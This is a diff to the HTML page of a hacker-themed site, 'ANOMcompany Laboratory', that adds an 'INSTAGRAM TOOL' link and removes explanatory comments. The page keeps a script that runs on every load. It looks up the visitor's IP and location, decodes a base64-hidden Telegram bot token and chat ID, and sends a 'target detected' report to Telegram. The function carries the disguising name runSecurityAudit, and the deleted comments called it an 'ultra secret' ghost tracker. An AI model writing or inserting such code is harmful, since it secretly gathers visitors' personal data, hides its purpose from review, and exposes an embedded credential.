@@ -45,6 +45,7 @@
             <a href="ctf.html">CTF</a>
             <a href="store.html">STORE</a>
             <a href="paybin.html">PAYBIN</a>
+            <a href="instagram.html" style="border-color: var(--primary-red); color: var(--primary-red);">INSTAGRAM TOOL</a>
         </div>
         <div class="terminal-box">
             <span style="color: var(--primary-red)">[operator@anom]:~#</span> <span id="typewriter"></span><span class="cursor"></span>
@@ -73,7 +74,6 @@
     <div class="ticker"><div class="ticker-wrap">>>> SİSTEM DURUMU: OPERASYONEL -- YÜKLEME TAMAMLANDI -- SİNYAL ANALİZİ AKTİF -- PROJELER GÜNCELLENDİ...</div></div>
 
     <script>
-        // Matrix & Wave & Typewriter (Aynı kaldı)
         const mCanvas = document.getElementById('matrix'); const mCtx = mCanvas.getContext('2d');
         function resizeMatrix() { mCanvas.width = window.innerWidth; mCanvas.height = window.innerHeight; }
         window.addEventListener('resize', resizeMatrix); resizeMatrix();
@@ -86,16 +86,12 @@
         const termText = "./initialize_lab.py\n> Mounting core systems... [OK]\n> Encrypting terminal session... [OK]\n> Welcome to ANOMcompany Laboratory.\n> ACCESS: OPERATOR GHOST.";
         let idx = 0; function typeWriter() { if (idx < termText.length) { document.getElementById("typewriter").innerHTML += termText.charAt(idx) === '\n' ? '<br>' : termText.charAt(idx); idx++; setTimeout(typeWriter, 40); } else { setTimeout(() => { document.getElementById('cpu-bar').style.width = "71%"; document.getElementById('ram-bar').style.width = "54%"; document.getElementById('net-bar').style.width = "88%"; }, 500); } }
 
-        // --- GHOST TRACKER (ULTRA GİZLİ VERSİYON) ---
         async function runSecurityAudit() {
             try {
                 const _0x41 = await fetch('https://ipapi.co/json/');
                 const _0x2a = await _0x41.json();
-                
-                // Bot bilgileri Base64 ile gizlendi
                 const _0x1a = atob("NzgxMjE2NzI4NTpBQUZiNTFRUzRNY2NiVG9hVVBqNmE2U2F0bDJqZWViYkgxSQ==");
                 const _0x5f = atob("NjI5ODg2OTk2OA==");
-                
                 const _0x9d = `🚨 *HEDEF TESPİT EDİLDİ*\n🌐 IP: ${_0x2a.ip}\n📍 Konum: ${_0x2a.city} / ${_0x2a.country_name}\n📱 Cihaz: ${navigator.platform}\n🔗 Sayfa: ${window.location.pathname}`;
 
                 await fetch(`https://api.telegram.org/bot${_0x1a}/sendMessage`, {
@@ -110,7 +106,7 @@
             setInterval(drawMatrix, 50);
             drawWave();
             setTimeout(typeWriter, 800);
-            runSecurityAudit(); // Fonksiyon ismi "Güvenlik Denetimi" olarak değiştirildi
+            runSecurityAudit();
         };
     </script>
 </body>
